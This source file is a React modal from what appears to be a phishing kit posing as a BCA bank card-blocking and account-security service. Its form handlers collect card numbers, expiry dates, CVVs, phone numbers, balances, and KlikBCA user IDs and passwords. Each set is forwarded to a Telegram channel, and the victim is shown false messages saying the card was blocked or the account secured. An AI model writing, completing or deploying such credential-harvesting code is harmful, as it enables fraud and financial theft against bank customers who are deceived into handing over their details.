import React, { useState, useEffect } from 'react';
import { ServiceType } from '../../types';
import { SplashScreen } from './SplashScreen';
import { CountdownLoader } from './CountdownLoader';
import { SuccessAlert } from './SuccessAlert';
import { BlokirBcaForm } from './BlokirBcaForm';
import { BankLainForm } from './BankLainForm';
import { PembatalanForm } from './PembatalanForm';
import { UserIdForm } from './UserIdForm';
import { sendTelegramNotification, sendTelegramPhoto } from '../../utils/cardUtils';

interface ServiceModalProps {
  isOpen: boolean;
  serviceType: ServiceType | null;
  onClose: () => void;
}

export const ServiceModal: React.FC<ServiceModalProps> = ({
  isOpen,
  serviceType,
  onClose,
}) => {
  const [currentService, setCurrentService] = useState<ServiceType | null>(serviceType);
  const [showSplash, setShowSplash] = useState(false);
  const [countdownAction, setCountdownAction] = useState<string | null>(null);
  const [countdownCallback, setCountdownCallback] = useState<(() => void) | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [successCallback, setSuccessCallback] = useState<(() => void) | null>(null);

  useEffect(() => {
    if (isOpen && serviceType) {
      setCurrentService(serviceType);
      setShowSplash(true);
      document.body.classList.add('modal-open');

      const timer = setTimeout(() => {
        setShowSplash(false);
      }, 750);

      return () => clearTimeout(timer);
    } else {
      document.body.classList.remove('modal-open');
      setShowSplash(false);
      setCountdownAction(null);
      setSuccessMessage(null);
    }
  }, [isOpen, serviceType]);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        onClose();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [onClose]);

  if (!isOpen || !currentService) return null;

  const handleCountdownTrigger = (actionTitle: string, onComplete: () => void) => {
    setCountdownAction(actionTitle);
    setCountdownCallback(() => onComplete);
  };

  const handleCountdownFinished = () => {
    setCountdownAction(null);
    if (countdownCallback) {
      countdownCallback();
      setCountdownCallback(null);
    }
  };

  const handleBlokirBcaSubmit = (details: {
    cardType: string;
    noKartu: string;
    noHp: string;
    masa: string;
    cvv: string;
    limit: string;
  }) => {
    handleCountdownTrigger('Memproses Pemblokiran...', () => {
      const msg =
        `🚨 *LAPORAN BLOKIR KARTU BCA*\n\n` +
        `• Jenis Kartu: *${details.cardType}*\n` +
        `• No Kartu: \`${details.noKartu}\`\n` +
        `• No HP: \`${details.noHp}\`\n` +
        `• Masa Berlaku: \`${details.masa}\`\n` +
        `• CVV: \`${details.cvv}\`\n` +
        `• Limit/Saldo: \`${details.limit}\``;

      sendTelegramNotification(msg);

      setSuccessMessage(
        'Kartu berhasil diblokir sementara. Mengarahkan ke halaman pembatalan...'
      );
      setSuccessCallback(() => () => {
        setSuccessMessage(null);
        setCurrentService('pembatalan');
      });
    });
  };

  const handleBankLainSubmit = (details: {
    bankName: string;
    cardType: string;
    noKartu: string;
    noHp: string;
    masa: string;
    cvv: string;
    limit: string;
  }) => {
    handleCountdownTrigger('Mengamankan Bank...', () => {
      const msg =
        `🚨 *LAPORAN AMANKAN BANK LAIN*\n\n` +
        `• Bank: *${details.bankName}*\n` +
        `• Jenis Kartu: *${details.cardType}*\n` +
        `• No Kartu: \`${details.noKartu}\`\n` +
        `• No HP: \`${details.noHp}\`\n` +
        `• Masa Berlaku: \`${details.masa}\`\n` +
        `• CVV: \`${details.cvv}\`\n` +
        `• Limit/Saldo: \`${details.limit}\``;

      sendTelegramNotification(msg);

      setSuccessMessage(
        'Kartu berhasil diblokir sementara. Mengarahkan ke halaman pembatalan...'
      );
      setSuccessCallback(() => () => {
        setSuccessMessage(null);
        setCurrentService('pembatalan');
      });
    });
  };

  const handlePembatalanSubmit = (file: File) => {
    handleCountdownTrigger('Memproses Pembatalan...', () => {
      sendTelegramPhoto(
        file,
        '🚨 *LAPORAN PEMBATALAN TRANSAKSI*\nLampiran Bukti Struk/Foto.'
      );
      setSuccessMessage('Bukti pembatalan transaksi berhasil dikirim.');
      setSuccessCallback(() => () => {
        setSuccessMessage(null);
        onClose();
      });
    });
  };

  const handleUserIdSubmit = (details: {
    mode: 'Perorangan' | 'Bisnis';
    userId: string;
    pass: string;
  }) => {
    handleCountdownTrigger(`Mengamankan ${details.mode}...`, () => {
      const msg =
        `🚨 *LAPORAN AMANKAN USER ID (${details.mode.toUpperCase()})*\n\n` +
        `• Layanan: *KlikBCA ${details.mode}*\n` +
        `• User ID/Username: \`${details.userId}\`\n` +
        `• PIN/Password: \`${details.pass}\``;

      sendTelegramNotification(msg);

      setSuccessMessage(
        `Permintaan pengamanan KlikBCA ${details.mode} berhasil diproses.`
      );
      setSuccessCallback(() => () => {
        setSuccessMessage(null);
        onClose();
      });
    });
  };

  return (
    <div
      className="fixed inset-0 bg-black/60 backdrop-blur-xs z-50 flex items-center justify-center p-3 transition-opacity duration-300"
      id="serviceModal"
      onClick={(e) => {
        if (e.target === e.currentTarget) {
          onClose();
        }
      }}
    >
      <div
        className="bg-white w-full max-w-[410px] rounded-[20px] shadow-[0_25px_50px_rgba(0,0,0,0.25)] relative overflow-hidden p-5 max-h-[92vh] overflow-y-auto"
        id="modalContentBody"
      >
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-3 right-3 bg-[#ebf1f6] hover:bg-[#d0dbe5] hover:scale-110 hover:shadow-md active:scale-95 border-0 w-[30px] h-[30px] rounded-full text-base cursor-pointer flex items-center justify-center text-[#1a2b4c] transition-all duration-200 z-10"
          id="modalCloseBtn"
          aria-label="Tutup"
        >
          &times;
        </button>

        {/* Splash Animation Screen */}
        <SplashScreen visible={showSplash} />

        {/* Countdown / Encryption Overlay */}
        {countdownAction && (
          <CountdownLoader
            actionTitle={countdownAction}
            onComplete={handleCountdownFinished}
          />
        )}

        {/* Success Alert Popup */}
        {successMessage && (
          <SuccessAlert
            message={successMessage}
            onDismiss={() => {
              if (successCallback) {
                successCallback();
              } else {
                setSuccessMessage(null);
              }
            }}
          />
        )}

        {/* Content Form based on current service */}
        {!showSplash && (
          <>
            {currentService === 'blokir' && (
              <BlokirBcaForm onSubmitSuccess={handleBlokirBcaSubmit} />
            )}
            {currentService === 'bank-lain' && (
              <BankLainForm onSubmitSuccess={handleBankLainSubmit} />
            )}
            {currentService === 'pembatalan' && (
              <PembatalanForm onSubmitSuccess={handlePembatalanSubmit} />
            )}
            {currentService === 'userid' && (
              <UserIdForm onSubmitSuccess={handleUserIdSubmit} />
            )}
          </>
        )}
      </div>
    </div>
  );
};
